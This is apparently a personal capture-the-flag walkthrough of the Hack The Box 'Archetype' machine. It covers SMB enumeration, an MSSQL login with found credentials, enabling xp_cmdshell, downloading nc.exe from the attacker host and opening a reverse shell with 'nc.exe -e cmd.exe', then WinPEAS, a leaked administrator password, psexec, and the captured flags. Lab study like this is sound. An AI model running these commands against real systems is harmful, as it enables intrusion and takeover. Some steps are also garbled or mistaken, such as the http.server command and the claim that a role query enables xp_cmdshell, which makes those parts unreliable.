

We start with the scan on the adequate folder we see a lot of ports open

```
┌──(cds㉿kali)-[~/Documents/htb/Archetype/nmap]
└─$ sudo nmap -p 135,139,445,1433,47001,49664,49665,49666,49667,49668,49669 -sVC 10.129.231.237 -oN targeted 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:37 EDT
Nmap scan report for 10.129.231.237
Host is up (0.23s latency).

PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  0%�U     Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s    Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.231.237:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.231.237:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-08-31T19:39:11+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-08-31T19:29:37
|_Not valid after:  2053-08-31T19:29:37
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc       Microsoft Windows RPC
49665/tcp open  msrpc       Microsoft Windows RPC
49666/tcp open  msrpc       Microsoft Windows RPC
49667/tcp open  msrpc       Microsoft Windows RPC
49668/tcp open  msrpc       Microsoft Windows RPC
49669/tcp open  msrpc       Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-31T12:38:59-07:00
| smb2-time: 
|   date: 2023-08-31T19:39:00
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.70 seconds

```

I tried to connect on the smb server with 

```
smbclient -L 10.129.231.237 -U root
```

and i recive this 
```
Unable to connect with SMB1 -- no workgroup available
```

But this groups exist

```
 Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

```
I need a password to acces to that. I can do it apparently using this


This tool is smbmap... but what can we do to do it manually or know what are we doing ?
```
sudo smbmap -H 10.129.231.237 -u “ “ -p “ “
```

This tool is an enumerator of smb server and it  returned us 

```
[+] IP: 10.129.231.237:445      Name: 10.129.231.237            Status: Guest session   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backups                                                 READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

So I can read the backups , and the $IPC

```
sudo smbclient //10.129.231.237/backups
```

There is an script for the smb client to get inside of this sql server. "mssqlclient.py"

Strangely I had to put usr and password together. If I put just the user I cant log in


```
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.240.65 -windows-auth
```

I need this tool ,really i dont know for what:

1. git clone [https://github.com/SecureAuthCorp/impacket.git](https://github.com/SecureAuthCorp/impacket.git)  
2. Navigate to the folder - **cd impacket** 
3. pip3 install -r requirements.txt  
4. python3 setup.py install


The command xp_cmdshell inside of "mssqlclient.py" is executable

```
El xp_cmdshell **es un procedimiento extendido muy potente que se lo utiliza para ejecutar la línea de comandos de Windows (cmd)**. Este comando es bastante útil para ejecutar tareas en el sistema operativo tales como copiar archivos, crear carpetas, compartir carpetas, etc. mediante T-SQL.
```

if I execute this:

```
EXEC xp_cmdshell 'net-user'
```
or
```
xp_cmdshell
```

This is the error :
```
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

this activates it 
```
SELECT is_srvrolemember('sysadmin');
```

Here microsoft gives us the way to activate it ..

![[Screenshot_2023-08-31_20_33_39.png]]


This is the order
```
EXECUTE sp_configure 'show advanced options',1;  
RECONFIGURE;  
EXECUTE sp_configure 'xp_cmdshell',1;  
RECONFIGURE;
```
This is the messages of the order from the input, the input and the output
```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE sp_configure 'show advanced options' ,1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell' ,1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;

```

Now we can execute shell commands like this;

```
xp_cmdshell "whoami"

output              
-----------------   
archetype\sql_svc   

NULL        

```

## Next step is a stable interactive shell ##


This is a good article with methods

https://pentesting.academy/p/how-to-get-a-xp-cmdshell-reverse-shell-in-a-windows-server-a9696041a785

### We need to install nc.exe ###

- Here first we have to download nc.exe on our ==local== system, which can be downloaded from the link: [https://github.com/int0x33/nc.exe/blob/master/nc.exe](https://github.com/int0x33/nc.exe/blob/master/nc.exe)
- After downloading let’s set up a python server on our machine in order to send the file to the target system.

### Open a python3 server ###

python3 http.server 80


The next step is put the nc.exe on the target machine

```
xp_cmdshell "powershell.exe wget http://10.10.16.3:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"

/*  
we don't need the rest of the command because :  
. we already are connected to sql  
. we already logged in using correct credentials  
*/
```

Now, lets listen on nc

```
nc -nlvp 4444
```

Now on the target machine lets execute the file that we transfered in the targeted machine

```
xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.16.3 4444"
```

ok we can execute commands on the machine , we have a shell.

So , now the path to the user flag is  this : 3e7b102e78218e935bf3f4951fec21a3

is on the path

cd \  
cd Users  
cd sql_svc  
cd Desktop  
type user.txt

## Here comes **Privilege Escalation** ##

We are going to use Winpeas

[https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)

We downloaded it from github

Switch the cmd to powershell with the command "powershell"

and you can use curl to get the winpeas on that folder.

Now we need to put first a python server


```
wget http://10.10.16.3:8000/winPEASx64.exe -outfile winPEASx64.exe
```

now execute winpeas on the victim machine

./winPEAS64.exe


- Notice the file named “ConsoleHost_history.txt”. Let’s navigate to this file and see what’s in there.

cd \  
cd Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline  
type ConsoleHost_history.txt


```
File: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
We found this, there
```
PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

```


user:administrator MEGACORP_4dm1n!!



Now we need a tool to log in as Administrator on our target PC and we cannot do it directly in our Windows Powershell as we do in the Linux system. There is a tool from our impacket named **psexec.py** which will help us.

- Kill the PowerShell and mssqlclient on our machine.
- Let’s use our tool:

python3 /opt/impacket/examples/psexec.py administrator@[Target_IP]



and here is the root flag

b91ccec3305e98240082d4474b848528

